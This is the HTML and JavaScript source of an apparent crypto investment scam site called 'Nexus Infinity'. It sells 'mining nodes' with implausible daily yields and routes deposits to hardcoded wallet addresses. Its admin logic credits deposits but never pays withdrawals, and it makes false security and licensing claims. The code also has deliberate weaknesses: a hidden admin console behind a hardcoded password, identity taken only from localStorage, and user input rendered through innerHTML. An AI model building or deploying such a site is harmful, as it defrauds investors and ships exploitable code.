<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Sovereign Global Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --n-pink: #ff00ff; --n-blue: #00d4ff; --bg: #030508; }
        body { background: var(--bg); color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.01); backdrop-filter: blur(60px); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 35px; }
        .btn-master { background: linear-gradient(135deg, #ff00ff, #00d4ff); font-weight: 800; padding: 18px; border-radius: 20px; text-transform: uppercase; width: 100%; border: none; color: white; cursor: pointer; transition: 0.4s; }
        .input-hub { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 15px; padding: 15px; color: white; width: 100%; outline: none; }
        .nav-item { color: #334155; transition: 0.4s; text-align: center; flex: 1; cursor: pointer; }
        .nav-active { color: #fff; text-shadow: 0 0 10px var(--n-pink); }
        .hidden { display: none !important; }
        #maintenance-screen { position: fixed; inset: 0; background: #030508; z-index: 20000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
    </style>
</head>
<body>

    <div id="maintenance-screen" class="hidden">
        <i class="fa-solid fa-gears text-6xl text-pink-500 animate-spin mb-8"></i>
        <h2 class="text-3xl font-black italic uppercase">System Maintenance</h2>
        <p class="text-zinc-500 mt-4 text-sm font-bold">Nexus Infrastructure is upgrading nodes. Back online shortly.</p>
    </div>

    <div id="dashboard" class="hidden pt-10 pb-32">
        <header class="p-6 flex justify-between items-center sticky top-0 bg-[#030508]/80 backdrop-blur-3xl z-50">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-white/5 rounded-xl flex items-center justify-center font-black text-pink-500 text-2xl">N</div>
                <div><p id="nav-user" class="text-sm font-black uppercase text-white italic">...</p></div>
            </div>
            <button onclick="switchPage('info')" class="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center text-blue-400"><i class="fa-solid fa-shield-halved"></i></button>
        </header>

        <main id="page-home" class="p-6 space-y-8">
            <div class="glass p-10 bg-gradient-to-br from-indigo-500/10 to-transparent relative overflow-hidden">
                <p class="text-[10px] font-black text-zinc-500 uppercase tracking-widest">Available Liquidity</p>
                <h2 id="balance-txt" class="text-5xl font-black italic">$0.00</h2>
                <div class="mt-8 flex justify-between border-t border-white/5 pt-6">
                    <div><p class="text-[8px] text-zinc-600 uppercase font-black">Mining Profit</p><p id="profit-txt" class="text-xl font-black text-pink-500">+$0.00</p></div>
                    <button onclick="copyRef()" class="bg-blue-600/20 text-blue-400 px-4 py-2 rounded-xl text-[8px] font-black uppercase">Ref Link</button>
                </div>
            </div>

            <div id="active-nodes-list" class="space-y-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-8 hidden">
            <div class="space-y-6 pb-10">
                <h3 class="text-xl font-black italic text-pink-500 uppercase tracking-tighter">Sovereign Elite Nodes</h3>
                <div id="elite-nodes" class="grid gap-4"></div>
                <h3 class="text-xl font-black italic text-blue-400 uppercase tracking-tighter mt-10">Institutional Nodes</h3>
                <div id="normal-nodes" class="grid gap-4"></div>
            </div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass p-8 space-y-6">
                <h3 class="text-lg font-black uppercase text-pink-500">Deposit Equity</h3>
                <select id="dep-method" class="input-hub" onchange="updateDepAddr()">
                    <option value="">Select Method</option>
                    <option value="USDT_TRC20">USDT (TRC20)</option>
                    <option value="TRX">TRON (TRX)</option>
                    <option value="BNB">Binance (BNB)</option>
                </select>
                <div id="dep-details" class="hidden space-y-4">
                    <p id="dep-addr-display" class="text-[9px] font-mono bg-black p-3 rounded-lg text-center select-all"></p>
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="input-hub">
                    <div class="relative">
                        <label class="block text-[9px] font-black text-zinc-500 mb-2 uppercase">Upload Screenshot Proof</label>
                        <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500">
                    </div>
                    <button onclick="processDeposit()" class="btn-master">Submit Protocol</button>
                </div>
            </div>

            <div class="glass p-8 space-y-6">
                <h3 class="text-lg font-black uppercase text-blue-400">Withdrawal Egress</h3>
                <select id="with-method" class="input-hub">
                    <option value="Binance">Binance Pay</option>
                    <option value="TrustWallet">Trust Wallet</option>
                    <option value="PayPal">PayPal Global</option>
                    <option value="CashApp">CashApp (US)</option>
                    <option value="Coinbase">Coinbase Commerce</option>
                    <option value="Payeer">Payeer</option>
                    <option value="Bank">Direct Bank Wire</option>
                </select>
                <input type="text" id="w-user" placeholder="Account Username/Email" class="input-hub">
                <input type="text" id="w-addr" placeholder="Wallet Address/Details" class="input-hub">
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-hub">
                <button onclick="processWithdraw()" class="btn-master !bg-white !text-black">Request Payout</button>
            </div>
        </main>

        <main id="page-info" class="p-6 space-y-8 hidden">
            <div class="glass p-8 space-y-6">
                <h3 class="text-xl font-black italic uppercase text-pink-500">About Nexus Infinity</h3>
                <p class="text-[11px] text-zinc-400 leading-relaxed font-bold">Nexus Infinity is a worldwide sovereign infrastructure provider, specializing in multi-chain protocol settlement and high-yield node infrastructure. Licensed under V4.0 global standards, we provide institutional-grade security for retail assets.</p>
                <hr class="border-white/5">
                <h4 class="text-sm font-black uppercase">FAQ</h4>
                <div class="space-y-4 text-[10px]">
                    <p><b class="text-blue-400">How fast is withdrawal?</b><br>Processed within 12-24 business hours.</p>
                    <p><b class="text-blue-400">Is my data secure?</b><br>Everything is encrypted via AES-512 Terminal standards.</p>
                </div>
            </div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-[#030508]/90 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-bolt text-xl"></i></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-server text-xl"></i></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-wallet text-xl"></i></div>
            <div onclick="switchPage('info')" class="nav-item"><i class="fa-solid fa-circle-info text-xl"></i></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#030508] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
            <h2 class="text-xl font-black italic text-pink-500 uppercase">Imperial Console</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button>
        </div>
        <div class="space-y-8">
            <div class="flex items-center justify-between glass p-4">
                <p class="text-xs font-black uppercase">Maintenance Mode</p>
                <input type="checkbox" id="m-toggle" onchange="toggleMaintenance(this.checked)">
            </div>
            <h3 class="text-xs font-black uppercase text-zinc-500">Pending Actions</h3>
            <div id="admin-requests" class="grid gap-4"></div>
            <h3 class="text-xs font-black uppercase text-zinc-500">System Users</h3>
            <div id="admin-users" class="grid gap-4"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // DATA: NODES
        const eliteNodes = Array.from({length: 6}, (_, i) => ({ id: i+100, title: `Sovereign Elite Node S-${i+1}`, price: 1000 + (i*500), daily: 150 + (i*75), img: `https://picsum.photos/seed/elite${i}/400/200` }));
        const normalNodes = Array.from({length: 12}, (_, i) => ({ id: i+1, title: `Node Protocol X-${i+1}`, price: 50 + (i*50), daily: 5 + (i*6), img: `https://picsum.photos/seed/norm${i}/400/200` }));

        window.onload = () => {
            renderNodes();
            checkMaintenance();
            const u = localStorage.getItem('nexus_user');
            if(u) showDashboard(u); else location.href = "login.html"; // Assuming a separate login or existing auth
        };

        function checkMaintenance() {
            onValue(ref(db, 'system/maintenance'), (s) => {
                if(s.val() === true) document.getElementById('maintenance-screen').classList.remove('hidden');
                else document.getElementById('maintenance-screen').classList.add('hidden');
            });
        }

        function renderNodes() {
            document.getElementById('elite-nodes').innerHTML = eliteNodes.map(n => nodeCard(n, 'from-pink-600 to-indigo-600')).join('');
            document.getElementById('normal-nodes').innerHTML = normalNodes.map(n => nodeCard(n, 'from-blue-600 to-cyan-600')).join('');
        }

        const nodeCard = (n, grad) => `
            <div class="glass overflow-hidden border border-white/5">
                <div class="h-24 bg-gradient-to-r ${grad} opacity-30"></div>
                <div class="p-6 flex justify-between items-center -mt-10">
                    <div><h4 class="font-black italic uppercase text-xs">${n.title}</h4><p class="text-[10px] text-green-400 font-black">Daily Yield: $${n.daily}</p></div>
                    <div class="text-right"><p class="text-xl font-black">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-2 bg-white text-black px-4 py-1 rounded-lg text-[9px] font-black uppercase">Activate</button></div>
                </div>
            </div>`;

        // BASE64 PROOF SYSTEM
        window.processDeposit = async () => {
            const file = document.getElementById('dep-proof').files[0];
            if(!file) return alert("Upload Proof, sweetie!");
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const base64 = reader.result;
                const u = localStorage.getItem('nexus_user');
                const hKey = push(ref(db, 'admin/requests')).key;
                const data = {
                    id: hKey, user: u, amount: document.getElementById('dep-amt').value,
                    tid: document.getElementById('dep-tid').value, proof: base64, 
                    method: document.getElementById('dep-method').value, type: 'Deposit', date: new Date().toLocaleString()
                };
                await set(ref(db, `admin/requests/${hKey}`), data);
                await set(ref(db, `users/${u}/history/${hKey}`), { ...data, proof: 'Image Stored' });
                alert("Deposit Protocol Initialized, sweetie! 💋");
            };
        };

        window.processWithdraw = async () => {
            const u = localStorage.getItem('nexus_user');
            const amt = parseFloat(document.getElementById('w-amt').value);
            const hKey = push(ref(db, 'admin/requests')).key;
            const data = {
                id: hKey, user: u, amount: amt, account: document.getElementById('w-user').value,
                method: document.getElementById('with-method').value, address: document.getElementById('w-addr').value,
                type: 'Withdrawal', date: new Date().toLocaleString()
            };
            await set(ref(db, `admin/requests/${hKey}`), data);
            alert("Withdrawal Egress Started! 💋");
        };

        // ADMIN POWERS
        window.toggleMaintenance = (val) => set(ref(db, 'system/maintenance'), val);
        
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { 
            taps++; if(taps === 4) { if(prompt("Auth:") === "coin786") { 
                document.getElementById('admin-panel').classList.remove('hidden'); 
                loadAdminData(); 
            } taps = 0; } 
        };

        function loadAdminData() {
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass p-5 border border-white/10">
                        <p class="text-[10px] font-black uppercase text-pink-500">${r.type} - $${r.amount}</p>
                        <p class="text-[8px] text-zinc-500">USER: ${r.user} | ${r.method}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-32 object-cover rounded mt-2">` : ''}
                        <div class="flex gap-2 mt-4">
                            <button onclick="approve('${r.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-500 py-2 rounded-lg text-[9px] font-black uppercase">Approve</button>
                            <button onclick="reject('${r.id}')" class="flex-1 bg-red-500 py-2 rounded-lg text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`).join('') : 'No pending requests';
            });
            onValue(ref(db, 'users'), (s) => {
                const u = s.val();
                document.getElementById('admin-users').innerHTML = u ? Object.values(u).map(user => `
                    <div class="glass p-4 flex justify-between items-center">
                        <p class="text-[10px] font-black uppercase">${user.username}</p>
                        <p class="text-[10px] text-blue-400 font-black">$${(user.balance || 0).toFixed(2)}</p>
                    </div>`).join('') : '';
            });
        }

        window.approve = async (id, user, amt, type) => {
            const s = await get(ref(db, `users/${user}`));
            if(type === 'Deposit') await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + amt });
            await remove(ref(db, `admin/requests/${id}`));
            alert("Action Approved!");
        };

        // UTILS
        window.switchPage = (p) => { 
            ['home','market','vault','info'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); 
            document.getElementById('page-'+p).classList.remove('hidden'); 
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active'));
        };

        window.updateDepAddr = () => {
            const m = document.getElementById('dep-method').value;
            const addrs = { USDT_TRC20: 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ', TRX: 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76', BNB: '0xD9359EADE5F5bACA51fb7da043767Bc0685bC355' };
            if(m) { document.getElementById('dep-addr-display').innerText = addrs[m]; document.getElementById('dep-details').classList.remove('hidden'); }
        };

        function showDashboard(uid) {
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
            });
        }
    </script>
</body>
</html>
